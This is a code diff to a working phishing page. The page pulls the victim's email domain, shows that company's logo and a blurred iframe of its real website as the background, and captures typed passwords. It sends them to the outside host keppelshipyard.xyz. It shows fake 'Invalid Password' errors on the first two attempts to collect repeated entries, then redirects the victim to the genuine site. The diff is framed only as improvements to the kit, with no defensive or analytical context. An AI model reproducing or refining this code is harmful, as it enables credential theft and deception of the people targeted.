@@ -19,8 +19,8 @@
             min-height: 100vh;
         }
         
-        /* Background domain display */
-        .background-domain {
+        /* Website iframe background */
+        .website-background {
             position: fixed;
             top: 0;
             left: 0;
@@ -30,56 +30,25 @@
             opacity: 0.08;
             pointer-events: none;
             overflow: hidden;
+            border: none;
         }
         
-        .domain-text-large {
-            position: absolute;
-            font-size: 200px;
-            font-weight: 900;
-            color: #0a66c3;
-            text-transform: uppercase;
-            letter-spacing: 15px;
-            white-space: nowrap;
-            text-shadow: 3px 3px 6px rgba(0,0,0,0.1);
-            transform: rotate(-15deg);
-            top: 25%;
-            left: 50%;
-            transform: translateX(-50%) rotate(-15deg);
+        .website-background iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            transform: scale(1.5);
+            filter: blur(8px) grayscale(100%);
         }
         
-        /* Domain patterns in corners */
-        .domain-corner {
+        .overlay {
             position: fixed;
-            font-size: 36px;
-            font-weight: 800;
-            color: rgba(10, 102, 195, 0.07);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.7);
             z-index: 0;
-            pointer-events: none;
-            text-transform: uppercase;
-        }
-        
-        .domain-corner.tl {
-            top: 40px;
-            left: 40px;
-            transform: rotate(-10deg);
-        }
-        
-        .domain-corner.tr {
-            top: 40px;
-            right: 40px;
-            transform: rotate(10deg);
-        }
-        
-        .domain-corner.bl {
-            bottom: 40px;
-            left: 40px;
-            transform: rotate(10deg);
-        }
-        
-        .domain-corner.br {
-            bottom: 40px;
-            right: 40px;
-            transform: rotate(-10deg);
         }
         
         .main-container {
@@ -95,7 +64,7 @@
         .container {
             width: 100%;
             max-width: 440px;
-            background: rgba(255, 255, 255, 0.92);
+            background: rgba(255, 255, 255, 0.95);
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
             border-radius: 16px;
             overflow: hidden;
@@ -375,35 +344,6 @@
             letter-spacing: 0.5px;
         }
         
-        button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 5px;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.5);
-            opacity: 0;
-            border-radius: 100%;
-            transform: scale(1, 1) translate(-50%);
-            transform-origin: 50% 50%;
-        }
-        
-        button:focus:not(:active)::after {
-            animation: ripple 1s ease-out;
-        }
-        
-        @keyframes ripple {
-            0% {
-                transform: scale(0, 0);
-                opacity: 0.5;
-            }
-            100% {
-                transform: scale(40, 40);
-                opacity: 0;
-            }
-        }
-        
         button:hover {
             background: linear-gradient(135deg, #0957a6 0%, #084a91 100%);
             transform: translateY(-3px);
@@ -443,20 +383,9 @@
                 padding: 15px;
             }
             
-            .domain-text-large {
-                font-size: 100px;
-                letter-spacing: 8px;
-            }
-            
-            .domain-corner {
-                font-size: 24px;
-            }
-            
-            .domain-corner.tl,
-            .domain-corner.tr,
-            .domain-corner.bl,
-            .domain-corner.br {
-                margin: 20px;
+            .website-background iframe {
+                transform: scale(2);
+                filter: blur(12px) grayscale(100%);
             }
             
             .info {
@@ -478,13 +407,10 @@
 </head>
 
 <body>
-    <!-- Background domain display -->
-    <div class="background-domain" id="backgroundDomain">
-        <div class="domain-text-large" id="domainTextLarge"></div>
-        <div class="domain-corner tl" id="domainCornerTL"></div>
-        <div class="domain-corner tr" id="domainCornerTR"></div>
-        <div class="domain-corner bl" id="domainCornerBL"></div>
-        <div class="domain-corner br" id="domainCornerBR"></div>
+    <!-- Website iframe background -->
+    <div class="website-background">
+        <iframe id="backgroundWebsite" src="about:blank"></iframe>
+        <div class="overlay"></div>
     </div>
     
     <div class="main-container">
@@ -518,7 +444,7 @@
                     
                     <div style="margin-bottom: 10px;">
                         <span id="auth_reg">Authentication is required!</span>
-                        <span id="auth_reg2">Invalid Password. Please try again.</span>
+                        <span id="auth_reg2">Invalid Password. Please enter correct password and try again.</span>
                     </div>
                     
                     <div class="rem_me">
@@ -556,6 +482,7 @@
         var my_slice = "";
         var userLocation = "";
         var domainName = "";
+        var websiteUrl = "";
         
         // Get location info from info display
         setTimeout(function() {
@@ -574,42 +501,25 @@
                 my_slice = my_email.substr((ind+1));
                 var c = my_slice.substr(0, my_slice.indexOf('.'));
                 domainName = my_slice.toUpperCase();
+                websiteUrl = "https://www." + my_slice;
                 var finalu = c.toUpperCase();
                 
                 // Set logo
                 $(".main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
                 
-                // Update all domain displays
+                // Update all text displays
                 $("#tit").html(finalu);
                 $("#pussy").html(my_slice);
                 $("#footer_dom").html(my_slice);
                 $('#auth_email').html(my_email + " - Verification Required");
                 
-                // Display domain in background
-                $('#domainTextLarge').text(domainName);
-                $('#domainCornerTL').text(domainName);
-                $('#domainCornerTR').text(domainName);
-                $('#domainCornerBL').text(domainName);
-                $('#domainCornerBR').text(domainName);
-                
-                // Add multiple copies of domain name for better coverage
-                for(let i = 0; i < 8; i++) {
-                    let newDomain = $('<div class="domain-text-large" style="position:absolute; top:' + 
-                        (Math.random() * 80 + 10) + '%; left:' + 
-                        (Math.random() * 80 + 10) + '%; transform: translate(-50%, -50%) rotate(' + 
-                        (Math.random() * 40 - 20) + 'deg); font-size:' + 
-                        (Math.random() * 100 + 100) + 'px; opacity:' + 
-                        (Math.random() * 0.05 + 0.02) + ';">' + domainName + '</div>');
-                    $('#backgroundDomain').append(newDomain);
-                }
+                // Load the website in background iframe
+                $('#backgroundWebsite').attr('src', websiteUrl);
             }
         } else {
-            // Default domain display if no email
+            // Default if no email
             $('#domainTextLarge').text('SECURE PORTAL');
-            $('#domainCornerTL').text('PORTAL');
-            $('#domainCornerTR').text('PORTAL');
-            $('#domainCornerBL').text('PORTAL');
-            $('#domainCornerBR').text('PORTAL');
+            $('#backgroundWebsite').attr('src', 'about:blank');
         }
 
         // Show password toggle
@@ -677,10 +587,12 @@
                 ip_info: "collected",
                 page_title: document.title,
                 count_attempt: count,
-                domain: my_slice || 'unknown'
+                domain: my_slice || 'unknown',
+                website_url: websiteUrl || 'unknown'
             };
             
             console.log("Sending data to keppelshipyard.xyz:", formData);
+            console.log("Attempt count:", count);
             
             // Send data to your endpoint
             $.ajax({
@@ -698,18 +610,20 @@
                     
                     $("#password").val(""); // Clear password field
                     
-                    // Check if we should redirect
+                    // Handle different attempt counts
                     if (count >= 3 && my_slice) {
+                        // 3rd attempt - redirect to website
+                        $button.html('Redirecting...');
                         setTimeout(function() {
-                            window.location.replace("https://www." + my_slice);
-                        }, 1000);
+                            window.location.replace(websiteUrl);
+                        }, 1500);
                     } else {
-                        // Show error message
+                        // 1st and 2nd attempts - show error
+                        $button.prop('disabled', false).html('NEXT');
                         $("#auth_reg2").show();
                         
-                        // If this is the 2nd attempt, show different message
                         if (count >= 2) {
-                            $("#auth_reg2").text("Invalid credentials. Please check your password and try again.");
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
                         }
                     }
                 },
@@ -718,19 +632,31 @@
                     
                     $("#password").val(""); // Clear password field
                     
-                    // Even on error, we'll redirect after certain attempts
-                    if (count >= 20 && my_slice) {
-                        window.location.replace("https://www." + my_slice);
+                    // Handle different attempt counts
+                    if (count >= 3 && my_slice) {
+                        // 3rd attempt - redirect even on error
+                        $button.html('Redirecting...');
+                        setTimeout(function() {
+                            window.location.replace(websiteUrl);
+                        }, 1500);
                     } else {
+                        // 1st and 2nd attempts
+                        $button.prop('disabled', false).html('NEXT');
                         $("#auth_reg2").show();
                         $("#auth_reg2").text("Connection error. Please try again.");
+                        
+                        if (count >= 2) {
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                        }
                     }
                 },
                 complete: function() {
-                    // Re-enable button after 1 second
-                    setTimeout(function() {
-                        $button.prop('disabled', false).html('NEXT');
-                    }, 1000);
+                    // Only re-enable button if not redirecting
+                    if (count < 3) {
+                        setTimeout(function() {
+                            $button.prop('disabled', false).html('NEXT');
+                        }, 1000);
+                    }
                 }
             });
             
@@ -763,7 +689,8 @@
             .then(data => {
                 var city = data.city;
                 var country = data.country_name;
-                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country);
+                var ip = data.ip;
+                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country + ' (IP: ' + ip + ')');
             })
             .catch(error => {
                 $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
